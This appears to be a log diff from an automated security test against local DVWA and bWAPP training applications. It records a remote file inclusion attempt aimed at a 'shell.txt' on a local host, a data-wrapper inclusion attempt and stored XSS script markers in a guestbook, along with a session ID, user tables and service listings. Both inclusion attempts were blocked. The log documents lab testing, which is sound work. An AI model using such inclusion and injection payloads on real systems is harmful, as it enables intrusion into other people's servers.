@@ -1,0 +1,18 @@
+﻿--- login: {"phpsessid": "dc221c1d48023a4c8c29b311b15ca2f6"}
+--- B1_RFI_attempt: {"payload": "http://127.0.0.1:8099/shell.txt", "status": 200, "executed": false, "sink_hits": 0, "err_in_body": false, "body_snippet": "<!DOCTYPE html> <html lang=\"en-GB\"> <head> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /> <title>Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA)</title> <link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" /> <link rel=\"ic", "note": "allow_url_include=Off 预期阻断；sink_hits=0 表示运行时未发起外连"}
+--- B1_data_wrapper_attempt: {"status": 200, "executed": false, "body_snippet": "<!DOCTYPE html> <html lang=\"en-GB\"> <head> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /> <title>Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA)<"}
+--- sink_hits_total: {"n": 0}
+--- final_docroot: {"v": "total 40\ndrwxr-xr-x  4 root     root      4096 Oct 12 10:07 .\ndrwxr-xr-x  3 root     root      4096 Jun 16 10:26 ..\ndrwxr-xr-x 12 root     root     12288 Oct 11 00:01 bWAPP\ndrwxr-xr-x 12 www-data www-data  4096 Oct  8 19:29 dvwa\n-rw-r--r--  1 root     root     10703 Jun 16 10:30 index.html\n-rw-r--r--  1 root     root       896 Jun 16 10:28 index.nginx-debian.html"}
+--- final_teaching_endpoint: {"http": 404}
+--- final_bwapp_users: {"v": "1\tA.I.M.\tA.I.M. or Authentication Is Missing\n2\tbee\tAny bugs?"}
+--- final_bwapp_blog_count: {"v": "0"}
+--- final_dvwa_guestbook: {"v": "1\ttest\n2\t<script>XSS_S_MARK_66</script>\n3\t<script>XSS_S_MARK_66</script>"}
+--- final_dvwa_users: {"v": "1\tadmin\n2\tgordonb\n3\t1337\n4\tpablo\n5\tsmithy"}
+--- final_services: {"v": "active\nactive\nLISTEN 0      80         127.0.0.1:3306       0.0.0.0:*    users:((\"mariadbd\",pid=1628,fd=37))\nLISTEN 0      5          127.0.0.1:8099       0.0.0.0:*    users:((\"python3\",pid=7128,fd=3))\nLISTEN 0      511                *:80               *:*    users:((\"apache2\",pid=6603,fd=4),(\"apache2\",pid=6602,fd=4),(\"apache2\",pid=6134,fd=4),(\"apache2\",pid=5273,fd=4),(\"apache2\",pid=4955,fd=4),(\"apache2\",pid=3079,fd=4),(\"apache2\",pid=3078,fd=4),(\"apache2\",pid=3077,fd=4),(\"apache2\",pid=3076,fd=4),(\"apache2\",pid=3075,fd=4),(\"apache2\",pid=1542,fd=4))"}
+--- sink_port_closed: {"v": "LISTEN 0      5          127.0.0.1:8099       0.0.0.0:*"}
+--- session_files_before: {"v": "sess_036dd2f56fcc1ec3e5538e1643d3f510\nsess_036dd2f56fcc1ec3e5538e1643d3f51e\nsess_loop3fixlow0000000000000000000001\nsess_loop3t4fixedsessionid000000000001\nsess_loop3t4recordingid0000000000001"}
+--- session_cleanup: {"v": "sess_036dd2f56fcc1ec3e5538e1643d3f510\nsess_loop3t4recordingid0000000000001"}
+--- session_files_after: {"v": "93"}
+{"rc": "ok"}
+{"rc": 0, "stdout_len": 2754, "stderr_len": 0}
+
